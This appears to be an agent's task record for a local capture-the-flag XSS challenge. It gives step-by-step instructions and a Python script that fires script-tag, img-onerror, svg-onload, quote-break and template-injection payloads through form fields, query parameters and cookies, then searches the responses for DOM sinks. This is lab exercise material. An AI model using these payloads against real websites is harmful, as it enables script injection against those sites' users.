# Objective and context
## Persistent Memory Context
The persistent memory workspace is empty. No prior reconnaissance, endpoints, credentials, or session artifacts are available for this XSS task.

Downstream agents should start from fresh discovery by making requests to the target, following forms and links, and identifying injection points that could allow execution of `alert('XSS')`. No inherited context exists to reuse.

Create a Python script to systematically test the XSS challenge at http://127.0.0.1:32911/xss25:

1. First, fetch the main CSS file at /static/css/style.css and print its contents - look for any comments or hints

2. Test multiple POST requests with different solution values and compare response sizes/contents:
   - Simple text: "test"
   - Common XSS payloads: "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"
   - Check if response changes based on input

3. Test GET requests with various query parameters:
   - ?solution=<script>alert('XSS')</script>
   - ?q=<script>alert('XSS')</script>
   - ?input=<script>alert('XSS')</script>

4. Check for DOM-based XSS by looking for any JavaScript in the response that might process URL parameters

5. Test the Cookie header injection:
   - Set a cookie with XSS payload

6. Print all responses with their sizes and look for any differences

Report any patterns or hints found in CSS comments or response variations.

import requests
import re

base_url = "http://127.0.0.1:32911"
target_endpoint = "/xss25"
css_file = "/static/css/style.css"

print("="*80)
print("STEP 1: Fetch CSS file and look for hints")
print("="*80)

try:
    css_response = requests.get(f"{base_url}{css_file}")
    print(f"[+] CSS File Status: {css_response.status_code}")
    print(f"[+] CSS File Size: {len(css_response.text)} bytes")
    print(f"[+] CSS Content:\n{css_response.text}")
    
    # Look for comments in CSS
    comments = re.findall(r'/\*.*?\*/', css_response.text, re.DOTALL)
    if comments:
        print(f"\n[!] CSS Comments Found:")
        for comment in comments:
            print(f"    {comment}")
except Exception as e:
    print(f"[-] Error fetching CSS: {e}")

print("\n" + "="*80)
print("STEP 2: Test POST requests with different payloads")
print("="*80)

post_payloads = [
    ("test", "simple text"),
    ("<script>alert('XSS')</script>", "basic script tag"),
    ("<img src=x onerror=alert('XSS')>", "img onerror"),
    ("{{constructor.constructor('alert(1)')()}}", "template literal"),
    ("<svg onload=alert('XSS')>", "svg onload"),
    ("'\"><script>alert('XSS')</script>", "quote break + script"),
]

post_results = []
for payload, description in post_payloads:
    try:
        # Try different parameter names
        for param in ['solution', 'input', 'data', 'payload']:
            resp = requests.post(f"{base_url}{target_endpoint}", data={param: payload})
            if resp.status_code != 404:  # Only report non-404 responses
                print(f"\n[+] POST {param}={payload[:50]}")
                print(f"    Description: {description}")
                print(f"    Status: {resp.status_code} | Size: {len(resp.text)} bytes")
                print(f"    Response preview: {resp.text[:500]}")
                post_results.append({
                    'param': param,
                    'payload': payload,
                    'status': resp.status_code,
                    'size': len(resp.text),
                    'response': resp.text
                })
    except Exception as e:
        print(f"[-] Error with payload {description}: {e}")

print("\n" + "="*80)
print("STEP 3: Test GET requests with query parameters")
print("="*80)

get_params = [
    ('solution', "<script>alert('XSS')</script>"),
    ('q', "<script>alert('XSS')</script>"),
    ('input', "<script>alert('XSS')</script>"),
    ('search', "<script>alert('XSS')</script>"),
    ('query', "<script>alert('XSS')</script>"),
]

get_results = []
for param, value in get_params:
    try:
        resp = requests.get(f"{base_url}{target_endpoint}", params={param: value})
        print(f"\n[+] GET ?{param}={value[:30]}")
        print(f"    Status: {resp.status_code} | Size: {len(resp.text)} bytes")
        print(f"    Response preview: {resp.text[:500]}")
        get_results.append({
            'param': param,
            'value': value,
            'status': resp.status_code,
            'size': len(resp.text),
            'response': resp.text
        })
    except Exception as e:
        print(f"[-] Error with GET {param}: {e}")

print("\n" + "="*80)
print("STEP 4: Check for DOM-based XSS patterns")
print("="*80)

# Fetch the main page and look for JavaScript
try:
    main_resp = requests.get(f"{base_url}{target_endpoint}")
    print(f"[+] Main page Status: {main_resp.status_code} | Size: {len(main_resp.text)} bytes")
    
    # Look for script tags
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', main_resp.text, re.DOTALL | re.IGNORECASE)
    if scripts:
        print(f"\n[!] Found {len(scripts)} script tag(s):")
        for i, script in enumerate(scripts):
            print(f"\n--- Script {i+1} ---")
            print(script[:500])
            
            # Look for dangerous DOM patterns
            dangerous_patterns = [
                r'document\.write',
                r'innerHTML',
                r'eval\(',
                r'location\.search',
                r'location\.hash',
                r'window\.location',
                r'document\.URL',
                r'document\.documentURI',
                r'document\.referrer',
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, script, re.IGNORECASE):
                    print(f"\n[!!!] DANGEROUS PATTERN FOUND: {pattern}")
    
    # Look for inline event handlers
    event_handlers = re.findall(r'on\w+\s*=\s*["\'][^"\']*["\']', main_resp.text, re.IGNORECASE)
    if event_handlers:
        print(f"\n[!] Found {len(event_handlers)} inline event handler(s):")
        for handler in event_handlers[:10]:  # Show first 10
            print(f"    {handler}")
    
    # Look for URL parameter processing
    url_patterns = re.findall(r'(location\.(?:search|hash|href)|document\.URL|window\.location)', main_resp.text, re.IGNORECASE)
    if url_patterns:
        print(f"\n[!] URL-related patterns found: {url_patterns}")
    
    print(f"\n[+] Full main page response:\n{main_resp.text}")
    
except Exception as e:
    print(f"[-] Error fetching main page: {e}")

print("\n" + "="*80)
print("STEP 5: Test Cookie header injection")
print("="*80)

cookie_payloads = [
    "session=<script>alert('XSS')</script>",
    "user=<img src=x onerror=alert('XSS')>",
    "data=<svg onload=alert('XSS')>",
]

for cookie_payload in cookie_payloads:
    try:
        headers = {'Cookie': cookie_payload}
        resp = requests.get(f"{base_url}{target_endpoint}", headers=headers)
        print(f"\n[+] Cookie: {cookie_payload[:40]}")
        print(f"    Status: {resp.status_code} | Size: {len(resp.text)} bytes")
        if "<script>" in resp.text or "alert" in resp.text:
            print(f"    [!] Potential XSS reflection in response!")
    except Exception as e:
        print(f"[-] Error with cookie {cookie_payload}: {e}")

print("\n" + "="*80)
print("STEP 6: Analyze response size variations")
print("="*80)

# Collect all unique response sizes
all_sizes = {}
for result in post_results:
    key = f"POST {result['param']}"
    if key not in all_sizes:
        all_sizes[key] = set()
    all_sizes[key].add(result['size'])

for result in get_results:
    key = f"GET {result['param']}"
    if key not in all_sizes:
        all_sizes[key] = set()
    all_sizes[key].add(result['size'])

print("\n[+] Response size variations by endpoint/parameter:")
for key, sizes in all_sizes.items():
    print(f"    {key}: {sizes} bytes")
    if len(sizes) > 1:
        print(f"        [!] SIZE VARIATION DETECTED - different responses for different payloads!")

print("\n" + "="*80)
print("ANALYSIS COMPLETE")
print("="*80)
